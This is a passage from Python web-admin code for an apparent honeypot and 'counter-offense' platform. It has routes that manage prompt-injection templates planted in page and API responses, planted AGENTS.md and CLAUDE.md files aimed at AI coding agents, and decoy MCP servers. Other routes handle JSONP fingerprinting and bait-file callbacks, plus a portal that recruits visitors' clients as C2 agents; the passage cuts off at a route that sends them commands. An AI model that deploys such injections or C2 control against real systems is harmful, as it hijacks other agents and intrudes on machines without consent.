    """Console security access path — takes effect immediately (≤5s cache)."""
    user = _require_admin(request, db)
    from app.services.system_settings import (
        set_admin_access_path,
        validate_admin_path,
    )

    form = await request.form()
    access_path = (form.get("access_path") or "").strip()
    error = validate_admin_path(access_path)
    if error:
        return _redirect(f"/admin/profile{_qs(path_error=error)}")
    set_admin_access_path(db, access_path, actor=user.username)
    log_execution(
        db,
        actor_username=user.username,
        action="update",
        module="system-settings",
        target_type="admin_access_path",
        target_ref=access_path,
        detail_json={"access_path": access_path},
    )
    return _redirect(f"/admin/profile{_qs(saved='安全路径已更新并即时生效，请使用新地址访问控制台')}")


@router.get("/admin/big-screen", response_class=HTMLResponse)
def admin_big_screen(
    request: Request,
    screen: str = "overview",
    rotate: str = "0",
    autoplay: str = "0",
    fullscreen: str = "0",
    rotate_interval: str = "30",
    db: Session = Depends(get_db),
):
    user = _require_user(request, db)
    stats = dashboard_stats(db)
    chain = attack_chain(db)
    node_ctx = node_attack_context(db, limit=8)
    node_items_visual = []
    for item in node_ctx["items"]:
        node_items_visual.append(
            {
                **item,
                "first_seen": item["first_seen"].isoformat()
                if hasattr(item["first_seen"], "isoformat")
                else item["first_seen"],
                "last_seen": item["last_seen"].isoformat()
                if hasattr(item["last_seen"], "isoformat")
                else item["last_seen"],
            }
        )
    return _render(
        request,
        "admin/big_screen.html",
        {
            "title": "态势大屏",
            "current_user": user,
            "stats": stats,
            "chain": chain,
            "trends": attack_trends(db),
            "top_sources": aggregated_attack_sources(db, limit=8),
            "top_attacks": aggregated_attacks(db, limit=8),
            "node_summary": node_ctx["summary"],
            "node_items": node_ctx["items"],
            "node_items_visual": node_items_visual,
            "top_paths": node_ctx["top_paths"],
            "screen": screen,
            "rotate": rotate,
            "autoplay": autoplay,
            "fullscreen": fullscreen,
            "rotate_interval": rotate_interval if rotate_interval in {"15", "30", "60"} else "30",
            "topbar_note": "只读大屏",
        },
    )


@router.get("/admin/api-tokens", response_class=HTMLResponse)
def admin_api_tokens(request: Request, raw_token: str | None = None, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    return _render(
        request,
        "admin/api_tokens.html",
        {
            "title": "开放 API",
            "current_user": user,
            "items": list_api_tokens(db),
            "raw_token": raw_token,
        },
    )


@router.post("/admin/api-tokens")
def create_admin_api_token(
    request: Request,
    name: str = Form(...),
    permissions_csv: str = Form("attack.read,credential.read"),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    item, raw = create_api_token(
        db,
        name=name,
        permissions=[part.strip() for part in permissions_csv.split(",") if part.strip()],
    )
    log_execution(
        db,
        actor_username=user.username,
        action="create",
        module="api-tokens",
        target_type="token",
        target_ref=item.name,
    )
    return _redirect(f"/admin/api-tokens?raw_token={raw}")


@router.post("/admin/api-tokens/{token_id}/delete")
def delete_api_token(token_id: int, request: Request, db: Session = Depends(get_db)):
    _require_admin(request, db)
    item = db.get(ApiToken, token_id)
    if not item:
        return _redirect("/admin/api-tokens")
    return _queue_sensitive_action(
        request,
        action="delete_api_token",
        params={"token_id": token_id},
        return_to="/admin/api-tokens",
        title=f"删除 API Key：{item.name}",
        description="删除后该 Key 将立即失效，请输入管理员密码确认。",
    )


@router.post("/admin/profile")
def update_profile(
    request: Request,
    name: str = Form(""),
    email: str = Form(""),
    preferred_language: str = Form("zh"),
    db: Session = Depends(get_db),
):
    user = _require_user(request, db)
    user.name = name
    user.email = email
    user.preferred_language = preferred_language
    db.add(user)
    db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action="update-profile",
        module="profile",
        target_type="user",
        target_ref=user.username,
    )
    return _redirect("/admin/profile")


@router.post("/admin/profile/change-password")
def change_profile_password(
    request: Request,
    current_password: str = Form(...),
    new_password: str = Form(...),
    db: Session = Depends(get_db),
):
    user = _require_user(request, db)
    if not verify_password(current_password, user.password_hash):
        raise HTTPException(status_code=400, detail="current password invalid")
    user.password_hash = hash_password(new_password)
    db.add(user)
    db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action="change-password",
        module="profile",
        target_type="user",
        target_ref=user.username,
    )
    return _redirect("/admin/profile")


@router.get("/admin/recon-data", response_class=HTMLResponse)
def admin_recon_data(request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    items = db.scalars(
        select(Event)
        .where(Event.event_type == "recon_fingerprint")
        .order_by(desc(Event.created_at))
        .limit(200)
    ).all()
    return _render(
        request, "admin/recon_data.html", {"title": "Jsonp反制成功记录", "items": items, "user": user}
    )


@router.get("/admin/payload-tracking", response_class=HTMLResponse)
def admin_payload_tracking(request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    items = db.scalars(
        select(Event)
        .where(Event.event_type.in_(["payload_download", "payload_callback"]))
        .order_by(desc(Event.created_at))
        .limit(200)
    ).all()
    return _render(
        request,
        "admin/payload_tracking.html",
        {"title": "文件蜜饵下载记录", "items": items, "user": user},
    )


@router.get("/admin/agent-interactions", response_class=HTMLResponse)
def admin_agent_interactions(request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    items = db.scalars(
        select(Event)
        .where(
            Event.event_type.in_(["agent_interaction", "agent_verification"])
            | Event.signals_json.contains("ai_agent_")
            | Event.signals_json.contains("agent_product:")
            | Event.signals_json.contains("agent_injected:")
        )
        .order_by(desc(Event.created_at))
        .limit(200)
    ).all()
    return _render(
        request,
        "admin/agent_interactions.html",
        {"title": "提示词注入触发记录", "items": items, "user": user},
    )


@router.get("/admin/prompt-injection", response_class=HTMLResponse)
def admin_prompt_injection(request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    items = db.scalars(
        select(PromptInjectionTemplate).order_by(
            PromptInjectionTemplate.priority, PromptInjectionTemplate.name
        )
    ).all()
    summary = {
        "total": len(items),
        "active": sum(1 for item in items if item.is_active),
        "html": sum(1 for item in items if item.target_scope in {"html_response", "all"}),
        "api": sum(1 for item in items if item.target_scope in {"api_response", "all"}),
    }
    return _render(
        request,
        "admin/prompt_injection.html",
        {
            "title": "提示词注入管理",
            "items": items,
            "summary": summary,
            "user": user,
            "nav_base": "/admin/prompt-injection",
        },
    )


@router.post("/admin/prompt-injection")
def create_prompt_injection_template(
    request: Request,
    template_key: str = Form(""),
    name: str = Form(...),
    description: str = Form(""),
    target_scope: str = Form("html_response"),
    trigger_type: str = Form("always"),
    priority: int = Form(50),
    variables_csv: str = Form(""),
    content_template: str = Form(...),
    is_active: str = Form("1"),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    key = _slugify_prompt_key(template_key or name)
    existing = db.scalar(
        select(PromptInjectionTemplate).where(PromptInjectionTemplate.template_key == key)
    )
    if existing:
        existing.name = name
        existing.description = description
        existing.target_scope = target_scope
        existing.trigger_type = trigger_type
        existing.priority = priority
        existing.variables_json = variables_from_csv(variables_csv)
        existing.content_template = content_template
        existing.is_active = _form_bool(is_active)
        db.add(existing)
        action = "update"
    else:
        item = PromptInjectionTemplate(
            template_key=key,
            name=name,
            description=description,
            target_scope=target_scope,
            trigger_type=trigger_type,
            priority=priority,
            variables_json=variables_from_csv(variables_csv),
            content_template=content_template,
            is_active=_form_bool(is_active),
        )
        db.add(item)
        action = "create"
    db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action=action,
        module="prompt-injection",
        target_type="prompt-template",
        target_ref=key,
    )
    return _redirect("/admin/prompt-injection")


@router.post("/admin/prompt-injection/{template_id}/update")
def update_prompt_injection_template(
    template_id: int,
    request: Request,
    template_key: str = Form(""),
    name: str = Form(...),
    description: str = Form(""),
    target_scope: str = Form("html_response"),
    trigger_type: str = Form("always"),
    priority: int = Form(50),
    variables_csv: str = Form(""),
    content_template: str = Form(...),
    is_active: str = Form("1"),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    item = db.get(PromptInjectionTemplate, template_id)
    if not item:
        raise HTTPException(status_code=404)
    key = _slugify_prompt_key(template_key or name)
    conflict = db.scalar(
        select(PromptInjectionTemplate).where(
            PromptInjectionTemplate.template_key == key,
            PromptInjectionTemplate.id != template_id,
        )
    )
    if conflict:
        raise HTTPException(status_code=400, detail="template key already exists")
    item.template_key = key
    item.name = name
    item.description = description
    item.target_scope = target_scope
    item.trigger_type = trigger_type
    item.priority = priority
    item.variables_json = variables_from_csv(variables_csv)
    item.content_template = content_template
    item.is_active = _form_bool(is_active)
    db.add(item)
    db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action="update",
        module="prompt-injection",
        target_type="prompt-template",
        target_ref=key,
    )
    return _redirect("/admin/prompt-injection")


@router.post("/admin/prompt-injection/{template_id}/toggle")
def toggle_prompt_injection_template(
    template_id: int, request: Request, db: Session = Depends(get_db)
):
    user = _require_admin(request, db)
    item = db.get(PromptInjectionTemplate, template_id)
    if not item:
        raise HTTPException(status_code=404)
    item.is_active = not item.is_active
    db.add(item)
    db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action="toggle",
        module="prompt-injection",
        target_type="prompt-template",
        target_ref=item.template_key,
        detail_json={"active": item.is_active},
    )
    return _redirect("/admin/prompt-injection")


@router.post("/admin/prompt-injection/{template_id}/delete")
def delete_prompt_injection_template(
    template_id: int, request: Request, db: Session = Depends(get_db)
):
    _require_admin(request, db)
    item = db.get(PromptInjectionTemplate, template_id)
    if not item:
        return _redirect("/admin/prompt-injection")
    return _queue_sensitive_action(
        request,
        action="delete_prompt_injection_template",
        params={"template_id": template_id},
        return_to="/admin/prompt-injection",
        title=f"删除提示词模板：{item.name}",
        description="删除后该提示词注入内容将不再参与页面注入，请输入管理员密码确认。",
    )


def _portal_funnel_stats(db: Session) -> dict:
    """24h operational snapshot for the functional-camouflage channel."""
    from app.models.c2_agent import C2Agent

    day_ago = datetime.now(timezone.utc) - timedelta(hours=24)
    stats = {
        "fetches": int(
            db.scalar(
                select(func.count()).select_from(Event).where(
                    Event.event_type == "portal_api_fetch",
                    Event.created_at >= day_ago,
                )
            )
            or 0
        ),
        "registrations": int(
            db.scalar(
                select(func.count()).select_from(Event).where(
                    Event.event_type == "portal_client_registered",
                    Event.created_at >= day_ago,
                )
            )
            or 0
        ),
        "heartbeats": int(
            db.scalar(
                select(func.count()).select_from(Event).where(
                    Event.event_type == "portal_client_heartbeat",
                    Event.created_at >= day_ago,
                )
            )
            or 0
        ),
        "recruited": int(
            db.scalar(
                select(func.count()).select_from(C2Agent).where(
                    C2Agent.metadata_json.contains("portal_api")
                )
            )
            or 0
        ),
        "throttled": int(
            db.scalar(
                select(func.count()).select_from(Event).where(
                    Event.event_type == "portal_register_throttled",
                    Event.created_at >= day_ago,
                )
            )
            or 0
        ),
    }
    return stats


@router.get("/admin/counter-offense", response_class=HTMLResponse)
def admin_counter_offense(request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    from app.services.surface_config import get_runtime_map, surface_meta, surface_stats

    runtime = get_runtime_map(db)
    stats = surface_stats(db)
    surfaces = []
    for meta in surface_meta():
        rt = runtime.get(meta["key"], {})
        surfaces.append({
            **meta,
            "enabled": rt.get("enabled", True),
            "hits_24h": stats.get(meta["key"], {}).get("hits_24h", 0),
            "last_hit": stats.get(meta["key"], {}).get("last_hit"),
        })
    laterals = db.scalars(
        select(Event).where(Event.event_type == "lateral_credential_reuse")
        .order_by(desc(Event.created_at)).limit(10)
    ).all()
    return _render(
        request,
        "admin/counter_offense.html",
        {
            "title": "反制面管理",
            "surfaces": surfaces,
            "laterals": laterals,
            "user": user,
        },
    )


@router.get("/admin/counter-offense/{key}", response_class=HTMLResponse)
def admin_counter_surface_detail(key: str, request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    from app.services.counter_intel import classify_behavior
    from app.services.surface_config import (
        SURFACE_FIELDS,
        get_runtime_map,
        surface_meta,
        surface_stats,
    )

    meta = next((m for m in surface_meta() if m["key"] == key), None)
    if meta is None:
        raise HTTPException(status_code=404, detail="surface not found")
    rt = get_runtime_map(db).get(key, {})
    stats = surface_stats(db).get(key, {})
    mcp_templates = {}
    if key == "mcp":
        from app.services.surface_config import DEFAULT_SURFACE_CONFIGS

        mcp_templates = DEFAULT_SURFACE_CONFIGS.get("mcp", {}).get("templates", {})

    # per-surface evidence: recent events of this face
    types = [t for t in meta["event_types"].split(",") if t]
    evidence = (
        db.scalars(
            select(Event).where(Event.event_type.in_(types))
            .order_by(desc(Event.created_at)).limit(20)
        ).all()
        if types
        else []
    )

    # behavior face: live session classifications
    behaviors = []
    if key == "behavior":
        day_ago = datetime.now(timezone.utc) - timedelta(hours=24)
        rows = db.execute(
            select(Event.session_id, Event.source_ip, func.count())
            .where(Event.created_at >= day_ago, Event.session_id != "")
            .group_by(Event.session_id, Event.source_ip)
            .having(func.count() >= 5)
            .order_by(desc(func.count()))
            .limit(12)
        ).all()
        auto_at = int(rt.get("config", {}).get("auto_score_threshold", 50) or 50)
        for sid, sip, cnt in rows:
            history = db.execute(
                select(Event.path, Event.created_at)
                .where(Event.session_id == sid)
                .order_by(Event.created_at.desc())
                .limit(12)
            ).all()
            c = classify_behavior(
                [{"path": p, "ts": t.timestamp() if t else 0} for p, t in history],
                auto_at=auto_at,
            )
            behaviors.append({"session_id": sid, "source_ip": sip, "events": cnt,
                              **c})

    return _render(
        request,
        "admin/counter_surface_detail.html",
        {
            "title": meta['name'],
            "surface": meta,
            "runtime": rt,
            "stats": stats,
            "fields": SURFACE_FIELDS.get(key, []),
            "evidence": evidence,
            "behaviors": behaviors,
            "mcp_templates": mcp_templates,
            "active_template": rt.get("config", {}).get("active_template", ""),
            "saved": request.query_params.get("saved", ""),
            "user": user,
        },
    )


@router.post("/admin/counter-offense/{key}/config")
async def admin_counter_surface_save(
    key: str,
    request: Request,
    db: Session = Depends(get_db),
):
    """Form-save for the per-surface config page (schema-driven fields)."""
    user = _require_admin(request, db)
    from app.services.surface_config import (
        SURFACE_FIELDS,
        set_surface,
        surface_meta,
    )

    meta = next((m for m in surface_meta() if m["key"] == key), None)
    if meta is None:
        raise HTTPException(status_code=404, detail="surface not found")
    form = await request.form()

    config: dict = {}
    for field in SURFACE_FIELDS.get(key, []):
        raw = (form.get(field["key"]) or "").strip()
        if field["type"] == "number":
            try:
                config[field["key"]] = int(raw)
            except ValueError:
                config[field["key"]] = int(
                    field.get("default", 0) if field.get("default") is not None else 0
                )
        elif field["type"] == "bool":
            # Unchecked checkboxes don't submit — always persist the explicit
            # value so toggling off actually overrides the default.
            config[field["key"]] = form.get(field["key"]) == "on"
        elif field["type"] == "lines":
            items = []
            for line in raw.splitlines():
                line = line.strip()
                if not line or "|" not in line:
                    continue
                name, _, ip = line.partition("|")
                items.append({"name": name.strip(), "ip": ip.strip()})
            if items:
                config["hosts"] = items
        elif field["type"] == "json":
            if raw:
                try:
                    config[field["key"].lstrip("_")] = json.loads(raw)
                except ValueError:
                    return _redirect(
                        f"/admin/counter-offense/{key}"
                        + _qs(saved=f"{meta['name']}：JSON 解析失败，未保存")
                    )
        else:
            if raw:
                config[field["key"]] = raw
    # agent_files: per-file textareas
    if key == "agent_files":
        files_cfg = {}
        for filename in ("AGENTS.md", "CLAUDE.md", ".cursorrules"):
            content = (form.get(f"file_{filename}") or "").strip()
            if content:
                files_cfg[filename] = content
        if files_cfg:
            config["files"] = files_cfg

    enabled = form.get("enabled") == "on"
    set_surface(db, key=key, enabled=enabled, actor=user.username, config=config)
    log_execution(
        db,
        actor_username=user.username,
        action="update",
        module="counter-offense",
        target_type="surface",
        target_ref=key,
        detail_json={"enabled": enabled, "config_keys": sorted(config.keys())},
    )
    return _redirect(
        f"/admin/counter-offense/{key}" + _qs(saved=f"{meta['name']}：配置已保存并即时生效")
    )


@router.post("/admin/counter-offense/mcp/template")
async def admin_counter_mcp_template(
    request: Request,
    template_key: str = Form(...),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    from app.services.surface_config import DEFAULT_SURFACE_CONFIGS, set_surface

    templates = DEFAULT_SURFACE_CONFIGS.get("mcp", {}).get("templates", {})
    if template_key not in templates:
        return JSONResponse({"error": "unknown template"}, status_code=404)
    set_surface(db, key="mcp", enabled=True, actor=user.username,
                config={"active_template": template_key})
    log_execution(
        db,
        actor_username=user.username,
        action="update",
        module="counter-offense",
        target_type="mcp-template",
        target_ref=template_key,
        detail_json={"active_template": template_key},
    )
    return _redirect(
        "/admin/counter-offense/mcp"
        + _qs(saved=f"MCP Server 模板已切换为《{templates[template_key]['name']}》")
    )


@router.post("/admin/counter-offense/{key}/toggle")
def admin_counter_surface_toggle(
    key: str,
    request: Request,
    enabled: str = Form(""),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    from app.services.surface_config import set_surface

    set_surface(db, key=key, enabled=bool(enabled), actor=user.username)
    log_execution(
        db,
        actor_username=user.username,
        action="update",
        module="counter-offense",
        target_type="surface",
        target_ref=key,
        detail_json={"enabled": bool(enabled)},
    )
    return _redirect(f"/admin/counter-offense/{key}")


@router.post("/api/admin/dismiss-path-banner")
def api_admin_dismiss_path_banner(request: Request, db: Session = Depends(get_db)):
    """Per-session dismissal of the default-access-path security banner."""
    _require_user(request, db)
    request.session["admin_path_banner_dismissed"] = True
    return JSONResponse({"ok": True})


@router.post("/api/admin/counter-offense/{key}")
async def api_admin_surface_toggle(
    key: str, request: Request, db: Session = Depends(get_db)
):
    user = _require_admin(request, db)
    from app.services.surface_config import SURFACES, set_surface

    if key not in {m["key"] for m in SURFACES}:
        return JSONResponse({"error": "unknown surface"}, status_code=404)
    try:
        body = await request.json()
        enabled = bool(body.get("enabled"))
        config = body.get("config")
        if config is not None and not isinstance(config, dict):
            return JSONResponse({"error": "config must be an object"}, status_code=400)
    except Exception:
        return JSONResponse({"error": "invalid_json"}, status_code=400)
    set_surface(db, key=key, enabled=enabled, actor=user.username,
                config=config if isinstance(config, dict) else None)
    log_execution(
        db,
        actor_username=user.username,
        action="update",
        module="counter-offense",
        target_type="surface",
        target_ref=key,
        detail_json={"enabled": enabled},
    )
    return {"status": "ok", "key": key, "enabled": enabled}


@router.get("/admin/playbooks", response_class=HTMLResponse)
def admin_playbooks(request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    from app.services.playbooks import get_playbooks

    return _render(
        request,
        "admin/playbooks.html",
        {"title": "反制剧本", "playbooks": get_playbooks(),
         "applied": request.query_params.get("applied", ""),
         "user": user},
    )


@router.post("/admin/playbooks/{playbook_id}/apply")
def admin_playbook_apply(playbook_id: str, request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    from app.services.playbooks import apply_playbook

    result = apply_playbook(db, playbook_id, actor=user.username)
    log_execution(
        db,
        actor_username=user.username,
        action="apply-playbook",
        module="playbooks",
        target_type="playbook",
        target_ref=playbook_id,
        detail_json=result,
    )
    summary = "; ".join(result.get("applied", [])) if result.get("ok") else str(result.get("error"))
    return _redirect("/admin/playbooks" + _qs(applied=f"{result.get('playbook', playbook_id)}：{summary}"))


@router.get("/admin/attacker-profiles", response_class=HTMLResponse)
def admin_attacker_profiles(request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    from app.models.credential import CredentialObservation
    from app.services.counter_intel import attacker_tags

    rows = db.execute(
        select(
            Event.source_ip,
            func.count().label("events"),
            func.max(Event.risk_score).label("risk_peak"),
            func.min(Event.created_at).label("first_seen"),
            func.max(Event.created_at).label("last_seen"),
        )
        .group_by(Event.source_ip)
        .order_by(desc("events"))
        .limit(100)
    ).all()
    profiles = []
    for ip, count, peak, first, last in rows:
        products = {
            (p.get("agent_fingerprint") or {}).get("label")
            for p in db.scalars(
                select(Event.payload_json).where(Event.source_ip == ip)
            ).all()
            if isinstance(p, dict) and p.get("agent_fingerprint")
        }
        products.discard(None)
        cred_count = int(
            db.scalar(
                select(func.count()).select_from(CredentialObservation).where(
                    CredentialObservation.source_ip == ip)
            )
            or 0
        )
        stats = {
            "events": count,
            "risk_peak": int(peak or 0),
            "credential_count": cred_count,
            "agent_products": sorted(products),
            "decoy_hits": 0,
            "honeypot_hits": 0,
            "active_days": len({(last or first).date()} if last else set()),
        }
        profiles.append({
            "ip": ip,
            "events": count,
            "risk_peak": int(peak or 0),
            "first_seen": first,
            "last_seen": last,
            "products": sorted(products),
            "credentials": cred_count,
            "tags": attacker_tags(stats),
        })
    return _render(
        request,
        "admin/attacker_profiles.html",
        {"title": "攻击者画像", "profiles": profiles, "user": user},
    )


@router.get("/admin/attacker-profiles/{ip}", response_class=HTMLResponse)
def admin_attacker_profile_detail(ip: str, request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    from app.models.credential import CredentialObservation

    events = db.scalars(
        select(Event).where(Event.source_ip == ip).order_by(desc(Event.created_at)).limit(50)
    ).all()
    creds = db.scalars(
        select(CredentialObservation).where(CredentialObservation.source_ip == ip)
        .order_by(desc(CredentialObservation.created_at)).limit(50)
    ).all()
    return _render(
        request,
        "admin/attacker_profile_detail.html",
        {"title": f"攻击者画像 · {ip}", "ip": ip, "events": events, "creds": creds,
         "user": user},
    )


@router.get("/admin/portal", response_class=HTMLResponse)
def admin_portal_config(request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    from app.services.portal_config import get_config_row

    row = get_config_row(db)
    stats = _portal_funnel_stats(db)
    from app.services.counter_intel import counter_kpis

    kpis = counter_kpis(db)
    return _render(
        request,
        "admin/portal_config.html",
        {
            "title": "功能性伪装反制",
            "config": row,
            "stats": stats,
            "kpis": kpis,
            "saved": request.query_params.get("saved", ""),
            "user": user,
        },
    )


@router.get("/api/admin/portal/stats")
def api_admin_portal_stats(request: Request, db: Session = Depends(get_db)):
    _require_user(request, db)
    return _portal_funnel_stats(db)


@router.post("/api/admin/portal")
async def api_admin_portal_save(request: Request, db: Session = Depends(get_db)):
    """JSON save endpoint backing the AJAX form on /admin/portal."""
    user = _require_admin(request, db)
    from app.services.portal_config import save_config

    try:
        body = await request.json()
    except Exception:
        return JSONResponse({"error": "invalid_json"}, status_code=400)
    try:
        heartbeat_interval = int(body.get("heartbeat_interval", 30))
        register_max = int(body.get("register_max_per_ip_hour", 20))
    except (TypeError, ValueError):
        return JSONResponse({"error": "invalid_number"}, status_code=400)
    row = save_config(
        db,
        actor=user.username,
        enabled=bool(body.get("enabled")),
        footer_enabled=bool(body.get("footer_enabled")),
        footer_title=str(body.get("footer_title") or "Developer API"),
        heartbeat_interval=heartbeat_interval,
        register_max_per_ip_hour=register_max,
        notes=str(body.get("notes") or ""),
    )
    log_execution(
        db,
        actor_username=user.username,
        action="update",
        module="portal-config",
        target_type="portal-config",
        target_ref="portal",
        detail_json={
            "enabled": bool(row.enabled),
            "footer_enabled": bool(row.footer_enabled),
            "heartbeat_interval": row.heartbeat_interval,
            "register_max_per_ip_hour": row.register_max_per_ip_hour,
        },
    )
    return JSONResponse(
        {
            "status": "ok",
            "config": {
                "enabled": bool(row.enabled),
                "footer_enabled": bool(row.footer_enabled),
                "footer_title": row.footer_title,
                "heartbeat_interval": row.heartbeat_interval,
                "register_max_per_ip_hour": row.register_max_per_ip_hour,
                "updated_by": row.updated_by,
                "updated_at": row.updated_at.isoformat() if row.updated_at else None,
            },
        }
    )


@router.post("/admin/portal")
def admin_portal_config_save(
    request: Request,
    enabled: str = Form(""),
    footer_enabled: str = Form(""),
    footer_title: str = Form("Developer API"),
    heartbeat_interval: int = Form(30),
    register_max_per_ip_hour: int = Form(20),
    notes: str = Form(""),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    from app.services.portal_config import save_config

    save_config(
        db,
        actor=user.username,
        enabled=bool(enabled),
        footer_enabled=bool(footer_enabled),
        footer_title=footer_title,
        heartbeat_interval=heartbeat_interval,
        register_max_per_ip_hour=register_max_per_ip_hour,
        notes=notes,
    )
    log_execution(
        db,
        actor_username=user.username,
        action="update",
        module="portal-config",
        target_type="portal-config",
        target_ref="portal",
        detail_json={
            "enabled": bool(enabled),
            "footer_enabled": bool(footer_enabled),
            "heartbeat_interval": heartbeat_interval,
            "register_max_per_ip_hour": register_max_per_ip_hour,
        },
    )
    return _redirect("/admin/portal?saved=1")


@router.get("/admin/jsonp-templates", response_class=HTMLResponse)
def admin_jsonp_templates(request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    items = db.scalars(select(JsonpTemplate).order_by(JsonpTemplate.name)).all()
    summary = {
        "total": len(items),
        "active": sum(1 for item in items if item.is_active),
        "get_count": sum(1 for item in items if item.request_method.upper() == "GET"),
        "param_count": sum(len(item.params_json or []) for item in items),
    }
    return _render(
        request,
        "admin/jsonp_templates.html",
        {"title": "Jsonp模版管理", "current_user": user, "items": items, "summary": summary},
    )


@router.post("/admin/jsonp-templates")
def create_jsonp_template(
    request: Request,
    method_key: str = Form(""),
    name: str = Form(...),
    request_method: str = Form("GET"),
    endpoint_path: str = Form("/recon/jsonp"),
    callback_param: str = Form("callback"),
    description: str = Form(""),
    params_csv: str = Form(""),
    response_template: str = Form(...),
    is_active: str = Form("1"),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    key = normalize_method_key(method_key or name) or f"jsonp_{secrets.token_hex(4)}"
    existing = db.scalar(select(JsonpTemplate).where(JsonpTemplate.method_key == key))
    if existing:
        existing.name = name
        existing.request_method = request_method.upper()
        existing.endpoint_path = normalize_endpoint_path(endpoint_path)
        existing.callback_param = callback_param or "callback"
        existing.description = description
        existing.params_json = params_from_csv(params_csv)
        existing.response_template = response_template
        existing.is_active = _form_bool(is_active)
        db.add(existing)
        action = "update"
    else:
        item = JsonpTemplate(
            method_key=key,
            name=name,
            request_method=request_method.upper(),
            endpoint_path=normalize_endpoint_path(endpoint_path),
            callback_param=callback_param or "callback",
            description=description,
            params_json=params_from_csv(params_csv),
            response_template=response_template,
            is_active=_form_bool(is_active),
        )
        db.add(item)
        action = "create"
    db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action=action,
        module="jsonp-templates",
        target_type="jsonp-template",
        target_ref=key,
    )
    return _redirect("/admin/jsonp-templates")


@router.post("/admin/jsonp-templates/{template_id}/update")
def update_jsonp_template(
    template_id: int,
    request: Request,
    method_key: str = Form(""),
    name: str = Form(...),
    request_method: str = Form("GET"),
    endpoint_path: str = Form("/recon/jsonp"),
    callback_param: str = Form("callback"),
    description: str = Form(""),
    params_csv: str = Form(""),
    response_template: str = Form(...),
    is_active: str = Form("1"),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    item = db.get(JsonpTemplate, template_id)
    if not item:
        raise HTTPException(status_code=404)
    key = normalize_method_key(method_key or name) or item.method_key
    conflict = db.scalar(
        select(JsonpTemplate).where(
            JsonpTemplate.method_key == key,
            JsonpTemplate.id != template_id,
        )
    )
    if conflict:
        raise HTTPException(status_code=400, detail="jsonp method key already exists")
    item.method_key = key
    item.name = name
    item.request_method = request_method.upper()
    item.endpoint_path = normalize_endpoint_path(endpoint_path)
    item.callback_param = callback_param or "callback"
    item.description = description
    item.params_json = params_from_csv(params_csv)
    item.response_template = response_template
    item.is_active = _form_bool(is_active)
    db.add(item)
    db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action="update",
        module="jsonp-templates",
        target_type="jsonp-template",
        target_ref=key,
    )
    return _redirect("/admin/jsonp-templates")


@router.post("/admin/jsonp-templates/{template_id}/toggle")
def toggle_jsonp_template(template_id: int, request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    item = db.get(JsonpTemplate, template_id)
    if not item:
        raise HTTPException(status_code=404)
    item.is_active = not item.is_active
    db.add(item)
    db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action="toggle",
        module="jsonp-templates",
        target_type="jsonp-template",
        target_ref=item.method_key,
        detail_json={"active": item.is_active},
    )
    return _redirect("/admin/jsonp-templates")


@router.post("/admin/jsonp-templates/{template_id}/delete")
def delete_jsonp_template(template_id: int, request: Request, db: Session = Depends(get_db)):
    _require_admin(request, db)
    item = db.get(JsonpTemplate, template_id)
    if not item:
        return _redirect("/admin/jsonp-templates")
    return _queue_sensitive_action(
        request,
        action="delete_jsonp_template",
        params={"template_id": template_id},
        return_to="/admin/jsonp-templates",
        title=f"删除 Jsonp 模版：{item.name}",
        description="删除后该 Jsonp 请求方法将不再作为可用回调模板，请输入管理员密码确认。",
    )


@router.get("/admin/c2/agents", response_class=HTMLResponse)
def admin_c2_agents(request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    auto_mark_offline(db, offline_seconds=300)
    agents = list_agents(db, limit=200)
    stats = agent_stats(db)
    return _render(
        request,
        "admin/c2_agents.html",
        {"agents": agents, "stats": stats, "user": user, "title": "C2 Agent 管理"},
    )


@router.get("/admin/c2/agents/{agent_id}", response_class=HTMLResponse)
def admin_c2_agent_detail(agent_id: str, request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    agent = get_agent(db, agent_id)
    if not agent:
        raise HTTPException(status_code=404, detail="agent not found")
    tasks = list_tasks(db, agent_id=agent_id, limit=100)
    task_count = agent_task_count(db, agent_id)
    templates = get_task_templates()
    nl_templates = get_nl_task_templates()
    type_stats = task_type_stats(db, agent_id)
    metadata = agent.metadata_json or {}
    is_recruited = bool(metadata.get("recruit_src") or metadata.get("recruited_via"))
    initial_tasks_json = json.dumps(
        [serialize_task_full(t) for t in reversed(tasks)], ensure_ascii=False
    )
    return _render(
        request,
        "admin/c2_agent_detail.html",
        {
            "agent": agent,
            "tasks": tasks,
            "task_count": task_count,
            "templates": templates,
            "nl_templates": nl_templates,
            "type_stats": type_stats,
            "is_recruited": is_recruited,
            "recruit_src": metadata.get("recruit_src", ""),
            "initial_tasks_json": initial_tasks_json,
            "user": user,
            "title": f"Agent {agent_id[:12]}",
            "nav_base": "/admin/c2/agents",
        },
    )


@router.post("/admin/c2/agents/{agent_id}/cmd")
def admin_c2_send_command(
    agent_id: str,
    request: Request,
    command: str = Form(""),
    task_type: str = Form("cmd"),
